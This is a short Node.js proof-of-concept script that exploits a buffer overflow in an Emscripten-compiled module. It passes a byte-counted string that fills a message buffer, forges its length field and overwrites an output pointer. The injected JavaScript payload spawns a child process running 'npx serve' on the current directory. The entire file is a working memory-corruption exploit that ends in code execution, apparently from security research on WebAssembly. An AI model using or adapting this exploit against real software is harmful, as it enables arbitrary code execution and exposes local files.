const code = require("./code.js");

const sleep = ms => new Promise(res => setTimeout(() => res(), ms));

sleep(150).then(() => {
  // Create a pointer using the 'Glue' method and the String value
  var ptr = code.allocate(
    code.intArrayFromString(
      "require('child_process').spawn('npx', ['serve', './']);//" + // 57 bytes
      "       " + // + 7 to fill .msg = 64
      "  " + // + 2 for alignment = 66
      "\x40\x00" + // + 2 bytes to fill .msg_len = 68
      "\x05\x00\x00\x00" // + 4 bytes to overwrite .out= 72
    ),
    "i8",
    code.ALLOC_NORMAL
  );

  // Call the method passing the pointer
  var retPtr = code._sup(ptr);

  // Retransform back your pointer to string using 'Glue' method
  var resValue = code.Pointer_stringify(retPtr);

  // Free the memory allocated by 'allocate'
  code._free(ptr);
});
